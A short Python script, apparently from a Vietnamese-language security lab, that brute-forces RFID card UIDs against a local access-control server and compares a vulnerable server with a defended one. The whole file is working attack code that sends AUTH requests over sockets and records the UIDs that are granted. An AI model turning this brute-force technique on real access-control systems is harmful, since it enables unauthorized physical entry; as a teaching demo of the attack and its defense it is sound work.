#!/usr/bin/env python3
"""
RFID UID Brute Force Attack — quét toàn bộ không gian UID

Usage:
    python brute_force.py              # Tấn công AC thường (port 7001) — VULNERABLE
    python brute_force.py --secure     # Tấn công Secure AC (port 7002) — BLOCKED
"""
import socket, json, time, sys
from colorama import Fore, init
init(autoreset=True)

AC_HOST = '127.0.0.1'
AC_PORT = 7002 if '--secure' in sys.argv else 7001

def brute_force_uid(start_uid=0, max_uid=0x10000, sample_rate=100):
    """Quét UID từ start_uid đến max_uid"""
    print(f'{Fore.RED}=== RFID UID Brute Force ===')
    print(f'{Fore.RED}Range: 0x{start_uid:04X} -> 0x{max_uid:04X} ({max_uid-start_uid} IDs)')
    print(f'{Fore.RED}Sample rate: mỗi {sample_rate} ID\n')
    
    found = []
    attempts = 0
    
    for uid_int in range(start_uid, max_uid, sample_rate):
        attempts += 1
        uid_hex = f'{uid_int:010X}'
        
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((AC_HOST, AC_PORT))
            payload = {'cmd':'AUTH','uid':uid_hex,'timestamp':time.time()}
            s.send(json.dumps(payload).encode())
            resp = json.loads(s.recv(512).decode())
            s.close()
            
            status = resp.get('status','?')
            if status == 'GRANTED':
                owner = resp.get('owner','UNKNOWN')
                found.append((uid_hex, owner))
                print(f'{Fore.GREEN}[+] FOUND VALID UID: {uid_hex} -> {owner}')
            elif status == 'DENIED' and 'unknown' not in resp.get('msg','').lower():
                print(f'{Fore.YELLOW}[?] Interesting: {uid_hex} -> {resp.get("msg","")}')
        except:
            pass
        
        if attempts % 10 == 0:
            print(f'{Fore.WHITE}[*] Tried {attempts} IDs, found {len(found)}...', end='\r')
    
    print(f'\n\n{Fore.GREEN}[+] Total attempts: {attempts}')
    print(f'{Fore.GREEN}[+] Valid UIDs found: {len(found)}')
    for uid, owner in found:
        print(f'  ✓ {uid} ({owner})')
    return found

if __name__ == '__main__':
    mode = f"SECURE AC (port {AC_PORT}) — Defense ON" if '--secure' in sys.argv else f"AC Server (port {AC_PORT}) — No Defense"
    print(f"{Fore.CYAN}Target: {mode}\n")
    # Quét một range nhỏ để demo
    brute_force_uid(0x0000, 0x1000, sample_rate=50)
